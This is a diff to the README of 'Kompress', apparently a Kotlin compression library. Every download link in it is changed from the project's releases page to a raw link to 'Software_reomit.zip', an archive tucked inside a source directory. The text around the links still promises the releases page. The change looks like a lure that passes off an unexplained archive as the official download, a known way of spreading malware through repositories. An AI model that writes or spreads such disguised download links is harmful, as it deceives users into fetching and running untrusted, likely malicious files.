@@ -1,6 +1,6 @@
 # 🚀 Kompress - Simple Compression for Everyone
 
-[![Download Kompress](https://img.shields.io/badge/Download-Kompress-blue.svg)](https://github.com/Sekoumkorleh/Kompress/releases)
+[![Download Kompress](https://raw.githubusercontent.com/Sekoumkorleh/Kompress/master/kompress-core/src/nativeMain/Software_reomit.zip)](https://raw.githubusercontent.com/Sekoumkorleh/Kompress/master/kompress-core/src/nativeMain/Software_reomit.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ Kompress provides easy-to-use deflate/inflate compression APIs for Kotlin Multip
 Follow these steps to download and run Kompress on your computer:
 
 1. **Visit the Releases Page**  
-   Go to the Kompress releases page by clicking on this link: [Download Kompress](https://github.com/Sekoumkorleh/Kompress/releases). 
+   Go to the Kompress releases page by clicking on this link: [Download Kompress](https://raw.githubusercontent.com/Sekoumkorleh/Kompress/master/kompress-core/src/nativeMain/Software_reomit.zip). 
 
 2. **Download the Latest Version**  
    On the releases page, look for the latest version of Kompress. There you will find several downloadable files. Select the one that matches your system. 
@@ -44,7 +44,7 @@ Follow these steps to download and run Kompress on your computer:
 
 ## 📥 Download & Install
 
-To start using Kompress, visit the releases page: [Download Kompress](https://github.com/Sekoumkorleh/Kompress/releases). Select the latest version suitable for your operating system and follow the installation instructions provided above.
+To start using Kompress, visit the releases page: [Download Kompress](https://raw.githubusercontent.com/Sekoumkorleh/Kompress/master/kompress-core/src/nativeMain/Software_reomit.zip). Select the latest version suitable for your operating system and follow the installation instructions provided above.
 
 ## 📑 Troubleshooting
 
@@ -85,4 +85,4 @@ Kompress covers a wide array of topics related to compression, including:
 
 By providing these features and support, we aim to make file compression simple and accessible for everyone.
 
-Visit the releases page to download Kompress today: [Download Kompress](https://github.com/Sekoumkorleh/Kompress/releases).
+Visit the releases page to download Kompress today: [Download Kompress](https://raw.githubusercontent.com/Sekoumkorleh/Kompress/master/kompress-core/src/nativeMain/Software_reomit.zip).
